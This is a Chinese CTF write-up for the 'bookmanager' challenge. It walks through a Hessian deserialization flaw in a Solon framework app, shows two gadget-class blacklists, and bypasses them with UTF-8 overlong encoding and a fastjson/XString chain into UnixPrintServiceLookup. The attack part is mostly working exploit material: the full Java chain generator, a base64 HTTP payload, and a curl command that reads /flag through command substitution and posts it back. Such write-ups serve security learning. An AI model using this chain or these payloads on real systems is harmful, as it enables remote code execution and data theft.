---
title: 第十八届国赛暨第二届长城杯-bookmanager题解
date: 2025-01-03 18:53:00 +0800
img_path: /
categories: [CTF, CTF比赛记录]
tags: [CTF, CTF比赛记录]   

---

# 第十八届国赛暨第二届长城杯-bookmanager题解

## 一、题目分析

题目给了一个jar包，反编译看到是solon框架，之前没接触过，然后就开始了搜索，找到了下面几个关键点。

### 1、路由规则

在`ApiGateway`中定义了路由，大概意思就是将`BookServiceImpl`这个类加入到book这个路径下，也就说访问的话就是`/api/rest/book/xxx`

![image-20250106141434835](assets/image-20250106141434835.png)

根据上面的可以写出下面的路径就是`/api/rest/book/getBook`，`/api/rest/book/getAllBooks`等等。

![image-20250106141731336](assets/image-20250106141731336.png)

### 2、漏洞挖掘

https://github.com/opensolon/solon/issues/73/

当使用框架的[GateWay](https://solon.noear.org/article/212)，并且引入官方依赖`solon.serialization.hessian`时，如果请求的`api`带有参数，请求包的`body`部分会用`hessian`进行反序列化， 从而导致远程命令执行。

然后本地调试发现确实是这样的，改一下`Content-Type: application/hessian`

```http
POST /api/rest/book/addBook HTTP/1.1
Content-Type: application/hessian
Host: 127.0.0.1:8080


xxxxxx
```

发包可以看到会将`body`的内容进行`hessian2`反序列化操作。

![image-20250106142139613](assets/image-20250106142139613.png)

调用栈如下：

```java
changeBody:177, HessianActionExecutor (org.noear.solon.serialization.hessian)
buildArgs:61, ActionExecuteHandlerDefault (org.noear.solon.core.handle)
executeHandle:47, ActionExecuteHandlerDefault (org.noear.solon.core.handle)
executeDo:329, Action (org.noear.solon.core.handle)
invoke0:268, Action (org.noear.solon.core.handle)
invoke:215, Action (org.noear.solon.core.handle)
handle0:224, Gateway (org.noear.solon.core.handle)
doFilter:206, Gateway (org.noear.solon.core.handle)
doFilter:-1, 521960438 (org.noear.solon.core.handle.Gateway$$Lambda$64)
doFilter:24, FilterChainImpl (org.noear.solon.core.handle)
handle:167, Gateway (org.noear.solon.core.handle)
handleMain:33, RouterHandler (org.noear.solon.core.route)
handleDo:64, RouterHandler (org.noear.solon.core.route)
doIntercept:24, RouterHandler (org.noear.solon.core.route)
doIntercept:47, RouterInterceptorLimiter (org.noear.solon.core.route)
doIntercept:27, RouterInterceptorChainImpl (org.noear.solon.core.route)
doIntercept:97, ChainManager (org.noear.solon.core)
handle:93, RouterHandler (org.noear.solon.core.route)
handle:41, HandlerPipeline (org.noear.solon.core.handle)
doFilter:473, SolonApp (org.noear.solon)
doFilter:-1, 1018937824 (org.noear.solon.SolonApp$$Lambda$15)
doFilter:24, FilterChainImpl (org.noear.solon.core.handle)
doFilter:49, ChainManager (org.noear.solon.core)
tryHandle:419, SolonApp (org.noear.solon)
handle:-1, 1506809545 (org.noear.solon.boot.jlhttp.XPluginImp$$Lambda$76)
handleDo:42, JlHttpContextHandler (org.noear.solon.boot.jlhttp)
serve:22, JlHttpContextHandler (org.noear.solon.boot.jlhttp)
serve:2253, HTTPServer (org.noear.solon.boot.jlhttp)
handleMethod:2215, HTTPServer (org.noear.solon.boot.jlhttp)
handleTransaction:2154, HTTPServer (org.noear.solon.boot.jlhttp)
handleConnection:2114, HTTPServer (org.noear.solon.boot.jlhttp)
execute:1895, HTTPServer$SocketHandlerThread (org.noear.solon.boot.jlhttp)
lambda$run$0:1867, HTTPServer$SocketHandlerThread (org.noear.solon.boot.jlhttp)
run:-1, 571100326 (org.noear.solon.boot.jlhttp.HTTPServer$SocketHandlerThread$$Lambda$83)
runWorker:1142, ThreadPoolExecutor (java.util.concurrent)
run:617, ThreadPoolExecutor$Worker (java.util.concurrent)
run:745, Thread (java.lang)
```

但是在进入`readObject`前有一个判断：`this.tested(body)`，这个`tested`方法其实就是通过KMP算法检查`body`请求体中传入的hessian数据流中是否存在黑名单里的字符串。

![image-20250106142507085](assets/image-20250106142507085.png)

`testCases`内容简单转换一下字符串可得到如下黑名单：

```java
bsh.
ch.qos.logback.core.db.
clojure.
com.alibaba.citrus.springext.support.parser.
com.alibaba.citrus.springext.util.SpringExtUtil.
com.alibaba.druid.pool.
com.alibaba.hotcode.internal.org.apache.commons.collections.functors.
com.alipay.custrelation.service.model.redress.
com.alipay.oceanbase.obproxy.druid.pool.
com.caucho.config.types.
com.caucho.hessian.test.
com.caucho.naming.
com.ibm.jtc.jax.xml.bind.v2.runtime.unmarshaller.
com.ibm.xltxe.rnm1.xtq.bcel.util.
com.mchange.v2.c3p0.
com.mysql.jdbc.util.
com.rometools.rome.feed.
com.sun.corba.se.impl.
com.sun.corba.se.spi.orbutil.
com.sun.jndi.ldap
com.sun.jndi.rmi.
com.sun.jndi.toolkit.
com.sun.org.apache.bcel.internal.
com.sun.org.apache.xalan.internal.
com.sun.rowset.
com.sun.xml.internal.bind.v2.
com.taobao.vipserver.commons.collections.functors.
groovy.lang.
java.awt.
java.beans.
java.lang.ProcessBuilder
java.lang.Runtime
java.rmi.server.
java.security.
java.util.ServiceLoader
java.util.StringTokenizer
javassist.bytecode.annotation.
javassist.tools.web.Viewer
javassist.util.proxy.
javax.imageio.
javax.imageio.spi.
javax.management.
javax.media.jai.remote.
javax.naming.
javax.script.
javax.sound.sampled.
javax.swing.
javax.xml.transform.
net.bytebuddy.dynamic.loading.
oracle.jdbc.connector.
oracle.jdbc.pool.
org.apache.aries.transaction.jms.
org.apache.bcel.util.
org.apache.carbondata.core.scan.expression.
org.apache.commons.beanutils.
org.apache.commons.codec.binary.
org.apache.commons.collections.functors.
org.apache.commons.collections4.functors.
org.apache.commons.codec.
org.apache.commons.configuration.
org.apache.commons.configuration2.
org.apache.commons.dbcp.datasources.
org.apache.commons.dbcp2.datasources.
org.apache.commons.fileupload.disk.
org.apache.ibatis.executor.loader.
org.apache.ibatis.javassist.bytecode.
org.apache.ibatis.javassist.tools.
org.apache.ibatis.javassist.util.
org.apache.ignite.cache.
org.apache.log.output.db.
org.apache.log4j.receivers.db.
org.apache.myfaces.view.facelets.el.
org.apache.openjpa.ee.
org.apache.shiro.
org.apache.tomcat.dbcp.
org.apache.velocity.runtime.
org.apache.velocity.
org.apache.wicket.util.
org.apache.xalan.xsltc.trax.
org.apache.xbean.naming.context.
org.apache.xpath.
org.apache.zookeeper.
org.aspectj.
org.codehaus.groovy.runtime.
org.datanucleus.store.rdbms.datasource.dbcp.datasources.
org.dom4j.
org.eclipse.jetty.util.log.
org.geotools.filter.
org.h2.value.
org.hibernate.tuple.component.
org.hibernate.type.
org.jboss.ejb3.
org.jboss.proxy.ejb.
org.jboss.resteasy.plugins.server.resourcefactory.
org.jboss.weld.interceptor.builder.
org.junit.
org.mockito.internal.creation.cglib.
org.mortbay.log.
org.mockito.
org.thymeleaf.
org.quartz.
org.springframework.aop.aspectj.
org.springframework.beans.BeanWrapperImpl$BeanPropertyHandler
org.springframework.beans.factory.
org.springframework.expression.spel.
org.springframework.jndi.
org.springframework.orm.
org.springframework.transaction.
org.yaml.snakeyaml.tokens.
ognl.
pstore.shaded.org.apache.commons.collections.
sun.print.
sun.rmi.server.
sun.rmi.transport.
weblogic.ejb20.internal.
weblogic.jms.common.
```

事实真实如此么🤔？并非如此，为什么呢，这里涉及到一个小知识点，简单的字符串判断其实并不是一个很好的判断黑名单的方法，因为这里可以通过[Hessian UTF-8 Overlong Encoding](https://exp10it.io/2024/02/hessian-utf-8-overlong-encoding/#/hessian)这种方法绕过这种简单的字符串判断。

### 3、尝试利用-失败

当我尝试使用Hessian UTF-8 Overlong Encoding的方法去绕过这个黑名单的时候，失败了（确实绕过tested方法了但是还有黑名单），好嘛套娃是吧，

![image-20250106144555494](assets/image-20250106144555494.png)

注意到`hessian-lite`

```
    <groupId>com.alibaba</groupId>
    <artifactId>hessian-lite</artifactId>
    <packaging>jar</packaging>
    <version>3.2.13</version>
    <name>Hessian Lite(Dubbo embed version)</name>
```

然后定位到`com.alibaba.com.caucho.hessian.io.ClassFactory`，这里还有个黑名单校验的类名。

![image-20250106144902944](assets/image-20250106144902944.png)

还是转换一下得到下方黑名单：

```java
bsh.
ch.qos.logback.core.db.
clojure.
com.alibaba.citrus.springext.support.parser.
com.alibaba.citrus.springext.util.SpringExtUtil.
com.alibaba.druid.pool.
com.alibaba.hotcode.internal.org.apache.commons.collections.functors.
com.alipay.custrelation.service.model.redress.
com.alipay.oceanbase.obproxy.druid.pool.
com.caucho.config.types.
com.caucho.hessian.test.
com.caucho.naming.
com.ibm.jtc.jax.xml.bind.v2.runtime.unmarshaller.
com.ibm.xltxe.rnm1.xtq.bcel.util.
com.mchange.v2.c3p0.
com.mysql.jdbc.util.
com.rometools.rome.feed.
com.sun.corba.se.impl.
com.sun.corba.se.spi.orbutil.
com.sun.jndi.rmi.
com.sun.jndi.toolkit.
com.sun.org.apache.bcel.internal.
com.sun.org.apache.xalan.internal.
com.sun.rowset.
com.sun.xml.internal.bind.v2.
com.taobao.vipserver.commons.collections.functors.
groovy.lang.
java.awt.
java.beans.
java.lang.ProcessBuilder
java.lang.Runtime
java.rmi.server.
java.security.
java.util.ServiceLoader
java.util.StringTokenizer
javassist.bytecode.annotation.
javassist.tools.web.Viewer
javassist.util.proxy.
javax.imageio.
javax.imageio.spi.
javax.management.
javax.media.jai.remote.
javax.naming.
javax.script.
javax.sound.sampled.
javax.swing.
javax.xml.transform.
net.bytebuddy.dynamic.loading.
oracle.jdbc.connector.
oracle.jdbc.pool.
org.apache.aries.transaction.jms.
org.apache.bcel.util.
org.apache.carbondata.core.scan.expression.
org.apache.commons.beanutils.
org.apache.commons.codec.binary.
org.apache.commons.collections.functors.
org.apache.commons.collections4.functors.
org.apache.commons.configuration.
org.apache.commons.configuration2.
org.apache.commons.dbcp.datasources.
org.apache.commons.dbcp2.datasources.
org.apache.commons.fileupload.disk.
org.apache.ibatis.executor.loader.
org.apache.ibatis.javassist.bytecode.
org.apache.ibatis.javassist.tools.
org.apache.ibatis.javassist.util.
org.apache.ignite.cache.
org.apache.log.output.db.
org.apache.log4j.receivers.db.
org.apache.myfaces.view.facelets.el.
org.apache.openjpa.ee.
org.apache.openjpa.ee.
org.apache.shiro.
org.apache.tomcat.dbcp.
org.apache.velocity.runtime.
org.apache.velocity.
org.apache.wicket.util.
org.apache.xalan.xsltc.trax.
org.apache.xbean.naming.context.
org.apache.xpath.
org.apache.zookeeper.
org.aspectj.apache.bcel.util.
org.codehaus.groovy.runtime.
org.datanucleus.store.rdbms.datasource.dbcp.datasources.
org.eclipse.jetty.util.log.
org.geotools.filter.
org.h2.value.
org.hibernate.tuple.component.
org.hibernate.type.
org.jboss.ejb3.
org.jboss.proxy.ejb.
org.jboss.resteasy.plugins.server.resourcefactory.
org.jboss.weld.interceptor.builder.
org.mockito.internal.creation.cglib.
org.mortbay.log.
org.quartz.
org.springframework.aop.aspectj.
org.springframework.beans.BeanWrapperImpl$BeanPropertyHandler
org.springframework.beans.factory.
org.springframework.expression.spel.
org.springframework.jndi.
org.springframework.orm.
org.springframework.transaction.
org.yaml.snakeyaml.tokens.
pstore.shaded.org.apache.commons.collections.
sun.rmi.server.
sun.rmi.transport.
weblogic.ejb20.internal.
weblogic.jms.common.
```

到这里就真得老老实实的去找链子了？，不过对比两个黑名单可以发现，左侧的是可绕过的黑名单，右侧那边黑名单中没有`sun.print.`，似乎可以是个突破口（就是）不过只适用于`Unix`，到这里思路基本明了了。

![image-20250106145221245](assets/image-20250106145221245.png)

### 4、尝试突破

`jar`包中存在`fastjson`依赖的，根据历史上大佬们挖的链子，要想钻`sun.print.`的空子得有一个调用任意`getter`的能力去调用`UnixPrintServiceLookup#getDefaultPrintService`，恰好`fastjson`中如果能调用`JSONObject#toString`方法来进行反序列化操作，而在起反序列化的过程中将会调用反序列化类的任意`getter`方法。

调用`JSONObject#toString`的话可以通过`com.sun.org.apache.xpath.internal.objects.XString`类

```java
package ysoserial.Hessian2.fastjson;

import com.alibaba.fastjson.JSONObject;
import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import com.caucho.hessian.io.SerializerFactory;
import com.sun.org.apache.xpath.internal.objects.XString;
import sun.misc.Unsafe;
import sun.print.UnixPrintServiceLookup;
import ysoserial.Hessian2.Hessian2OutputWithOverlongEncoding;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.EOFException;
import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;

public class XStringToGeter {
    public static void setFieldValue(Object obj, String filedName, Object value) throws NoSuchFieldException, IllegalAccessException {
        Field declaredField = obj.getClass().getDeclaredField(filedName);
        declaredField.setAccessible(true);
        declaredField.set(obj, value);
    }

    public static void main(String[] args) {
        try {
            //需要执行的命令
            String cmd = "touch /app/success";
            Field theUnsafe = Unsafe.class.getDeclaredField("theUnsafe");
            theUnsafe.setAccessible(true);
            Unsafe unsafe = (Unsafe) theUnsafe.get(null);
            Object unixPrintServiceLookup = unsafe.allocateInstance(UnixPrintServiceLookup.class);
            //设置属性
            setFieldValue(unixPrintServiceLookup, "cmdIndex", 0);
            setFieldValue(unixPrintServiceLookup, "osname", "xx");
            setFieldValue(unixPrintServiceLookup, "lpcFirstCom", new String[]{cmd, cmd, cmd});
            //封装一个JSONObject对象调用getter方法
            JSONObject jsonObject = new JSONObject();
            jsonObject.put("xx", unixPrintServiceLookup);
            
            //使用XString类调用toString方法
            XString xString = new XString("xx");
            HashMap map1 = new HashMap();
            HashMap map2 = new HashMap();
            map1.put("yy", jsonObject);
            map1.put("zZ", xString);
            map2.put("yy", xString);
            map2.put("zZ", jsonObject);

            HashMap s = new HashMap();
            setFieldValue(s, "size", 2);
            Class nodeC;
            try {
                nodeC = Class.forName("java.util.HashMap$Node");
            } catch (ClassNotFoundException e) {
                nodeC = Class.forName("java.util.HashMap$Entry");
            }
            Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
            nodeCons.setAccessible(true);
            Object tbl = Array.newInstance(nodeC, 2);
            Array.set(tbl, 0, nodeCons.newInstance(0, map1, map1, null));
            Array.set(tbl, 1, nodeCons.newInstance(0, map2, map2, null));
            setFieldValue(s, "table", tbl);

            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            Hessian2OutputWithOverlongEncoding hessianOutput = new Hessian2OutputWithOverlongEncoding(byteArrayOutputStream);
            hessianOutput.setSerializerFactory(new SerializerFactory());
            hessianOutput.getSerializerFactory().setAllowNonSerializable(true);
            hessianOutput.writeObject(s);
            hessianOutput.flushBuffer();
			 System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));
            des(byteArrayOutputStream.toByteArray());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public static Object des(byte[] bytes) throws IOException {
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        Hessian2Input hessianInput = new Hessian2Input(byteArrayInputStream);
        try {
            return hessianInput.readObject();
        } catch (EOFException e) {
            throw new IOException("Unexpected end of file while reading object", e);
        }
    }
}
```

## 二、漏洞利用

```http
POST /api/rest/book/addBook HTTP/1.1
Content-Type: application/hessian
Host: 127.0.0.1:8080

{{base64dec(SEgCwbnBuU0fwaPBr8GtwK7BocGswanBosGhwaLBocCuwabBocGzwbTBqsGzwa/BrsCuwYrBk8GPwY7Bj8GiwarBpcGjwbQCwbjBuEMwIMGzwbXBrsCuwbDBssGpwa7BtMCuwZXBrsGpwbjBkMGywanBrsG0wZPBpcGywbbBqcGjwaXBjMGvwa/Bq8G1wbCYDsGkwaXBpsGhwbXBrMG0wZDBssGpwa7BtMGlwbITwaTBpcGmwaHBtcGswbTBkMGywanBrsG0wZPBpcGywbbBqcGjwaUNwbDBssGpwa7BtMGTwaXBssG2wanBo8GlwbMPwazBr8GvwavBtcGwwYzBqcGzwbTBpcGuwaXBssGzDMGswbDBjsGhwa3BpcGDwa/BrcGBwanBuAvBrMGwwaPBhsGpwbLBs8G0wYPBr8GtCcGswbDBo8GBwazBrMGDwa/BrQrBrMGwwaPBjsGhwa3BpcGDwa/BrWBOTk5OTnMHwZvBs8G0wbLBqcGuwacSwbTBr8G1waPBqMCgwK/BocGwwbDAr8GzwbXBo8GjwaXBs8GzEsG0wa/BtcGjwajAoMCvwaHBsMGwwK/Bs8G1waPBo8GlwbPBsxLBtMGvwbXBo8GowKDAr8GhwbDBsMCvwbPBtcGjwaPBpcGzwbNOTloCwbrBmkMwMcGjwa/BrcCuwbPBtcGuwK7Br8GywafArsGhwbDBocGjwajBpcCuwbjBsMGhwbTBqMCuwanBrsG0waXBssGuwaHBrMCuwa/BosGqwaXBo8G0wbPArsGYwZPBtMGywanBrsGnkgXBrcGfwa/BosGqCMGtwZ/BsMGhwbLBpcGuwbRhAsG4wbhOWlGRSALBucG5UZUCwbrBmlGSWlGWWg==)}}
```

可以看到执行成功了。

![image-20250106152857530](assets/image-20250106152857530.png)

## 三、总结

这个题听说比赛的时候好像是0解（我没参加，单纯研究）所以想尝试尝试，但因为是比赛结束后做的也就随便搞了个Java环境，在弹shell的时候没成功，这个题实战意义不详，点到为止吧，所以也不清楚这个方法到底是不是能够拿到flag或者说是官方解。不过在我去本地拉`hessian-lite 3.2.13`的时候对比发现`ClassFactory`这个类被动过，所以大概率是出题人的操作，不过也学到了不少东西。

```
<!-- https://mvnrepository.com/artifact/com.alibaba/hessian-lite -->
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>hessian-lite</artifactId>
    <version>3.2.13</version>
</dependency>
```

想了一下，`/getAllBooks`是可以显示所以`book`信息的，或许可以让他本地执行命令将flag的内容通过`/addBook`接口拼接添加进去，然后就可以通过`/getAllBooks`接口回显出来了。

```java
   @Mapping("/getAllBooks")
   public Result getAllBooks() {
      List books = this.bookDao.getAllBooks();
      return Result.succeed(books);
   }
```

```java
   @Mapping("/addBook")
   public Result addBook(BookModel book) {
      boolean isAdded = this.bookDao.addBook(book);
      return isAdded ? Result.succeed("图书添加成功") : Result.failure("图书添加失败");
   }
```

只需要将命令改为下方，然后生成链子就好，这样就可以拿到flag了，不过得猜测`flag`到底是文件还是一个形如`readFlag`可执行文件，以及他的路径位置，不过大都是在根目录`/flag`或者`/readFlag`

```java
            String cmd = "curl -X POST http://127.0:8080/api/rest/book/addBook -H \"Content-Type: application/json\" -d '{\"bookId\": 1, \"title\": \"'$(cat /app/flag)'\", \"author\": \"'$(cat /flag)'\", \"publishDate\": \"2025-01-01\", \"price\": 13.14}'";
```

